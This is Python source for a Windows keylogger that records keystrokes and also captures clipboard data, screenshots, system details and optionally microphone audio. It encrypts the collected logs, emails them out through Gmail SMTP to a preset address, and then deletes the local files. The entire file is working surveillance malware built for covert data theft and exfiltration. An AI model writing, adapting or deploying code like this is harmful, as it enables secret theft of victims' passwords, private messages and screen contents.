from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os
from dotenv import load_dotenv
import logging
from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from PIL import ImageGrab


# Constants
MICROPHONE_TIME = 10
TIME_ITERATION = 15
NUMBER_OF_ITERATIONS_END = 3

load_dotenv() # load environment variables

EMAIL_ADDRESS = os.getenv('EMAIL_ADDRESS')
PASSWORD = os.getenv('PASSWORD')
TO_ADDR = os.getenv('TO_ADDR')

username = getpass.getuser()

# File paths
file_path = "C:\\Users\\SOC\\PycharmProjects\\pythonKeylogger\\Project"
extend = "\\"
file_merge = file_path + extend

# Encryption Key
KEY = "j8m2foeb9665zwiyqZDLi3w9WB-LC3yRak0Cw7Ge9HQ="

# Setup logging to keep track of activities
logging.basicConfig(filename="keylogger.log", level=logging.DEBUG, format="%(asctime)s - %(message)s")


def send_email(filename, attachment, from_addr, to_addr):
    """Send email with attachment"""
    try:
        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = "Log File"
        body = "Please find the attached log file."

        msg.attach(MIMEText(body, 'plain'))

        with open(attachment, 'rb') as file:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(file.read())
            encoders.encode_base64(p)
            p.add_header("Content-Disposition", f"attachment; filename={filename}")
            msg.attach(p)

        with smtplib.SMTP('smtp.gmail.com', 587) as s:
            s.starttls()
            s.login(from_addr, PASSWORD)
            s.sendmail(from_addr, to_addr, msg.as_string())

        logging.info(f"Email sent to {to_addr}")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")


def computer_information():
    """Collect computer information (hostname, IP address, etc.)"""
    try:
        with open(file_merge + "systeminfo.txt", "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api/ipify.org").text
                f.write(f"Public IP Address: {public_ip}\n")
            except Exception:
                f.write("Couldn't get Public IP Address (API limit reached)\n")

            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {IPAddr}\n")
        logging.info("System information collected.")
    except Exception as e:
        logging.error(f"Error collecting system information: {e}")


def copy_clipboard():
    """Collect clipboard data"""
    try:
        with open(file_merge + "clipboard.txt", "a") as f:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write(f"Clipboard Data: {pasted_data}\n")
        logging.info("Clipboard data collected.")
    except Exception as e:
        logging.error(f"Error collecting clipboard data: {e}")


def microphone():
    """Record microphone input"""
    fs = 44100                  # sample rate
    seconds = MICROPHONE_TIME   # duration

    try:
        my_recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(file_merge + "audio.wav", fs, my_recording)
        logging.info("Audio recorded.")
    except Exception as e:
        logging.error(f"Error recording audio: {e}")


def screenshot():
    """Capture a screenshot of the screen"""
    try:
        im = ImageGrab.grab()
        im.save(file_merge + "screenshot.png")
        logging.info("Screenshot taken.")
    except Exception as e:
        logging.error(f"Error capturing screenshot: {e}")


def keylogger():
    """Capture key presses and log them"""
    keys = []
    count = 0

    def on_press(key):
        nonlocal keys, count

        keys.append(key)
        count += 1

        if count >= 10: # write every 10 keystrokes
            write_keys_to_file(keys)
            keys = []
            count = 0

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()



def write_keys_to_file(keys):
    """Write keys to a file"""
    try:
        with open(file_merge + "key_log.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if "space" in k:
                    f.write(" ")
                elif "Key" not in k:
                    f.write(k)
        logging.info("Keystrokes logged.")
    except Exception as e:
        logging.error(f"Error writing keystrokes: {e}")


def encrypt_files():
    """Encrypt collected files"""
    try:
        files_to_encrypt = [file_merge + "key_log.txt", file_merge + "clipboard.txt", file_merge + "systeminfo.txt"]
        encrypted_file_names = [file_merge + "e_key_log.txt", file_merge + "e_clipboard.txt", file_merge + "e_systeminfo.txt"]
        fernet = Fernet(KEY)

        for original, encrypted in zip(files_to_encrypt, encrypted_file_names):
            with open(original, "rb") as f:
                data = f.read()

            encrypted_data = fernet.encrypt(data)

            with open(encrypted, "wb") as f:
                f.write(encrypted_data)

            send_email(encrypted, encrypted, EMAIL_ADDRESS, TO_ADDR)
            logging.info(f"Encrypted and emailed {encrypted}")

    except Exception as e:
        logging.error(f"Error encrypting files: {e}")


def delete_files():
    """Delete sensitive files after encryption"""
    try:
        os.remove(file_merge + "key_log.txt")
        os.remove(file_merge + "clipboard.txt")
        os.remove(file_merge + "systeminfo.txt")
        logging.info("Sensitive files deleted.")
    except Exception as e:
        logging.error(f"Error deleting files: {e}")


def main():
    """Main function to execute the program flow"""
    try:
        computer_information()
        copy_clipboard()
        # microphone()
        screenshot()

        for _ in range(NUMBER_OF_ITERATIONS_END):
            keylogger()
            time.sleep(TIME_ITERATION)

        encrypt_files()
        delete_files()
    except Exception as e:
        logging.error(f"Unexpected error: {e}")


if __name__ == "__main__":
        main()

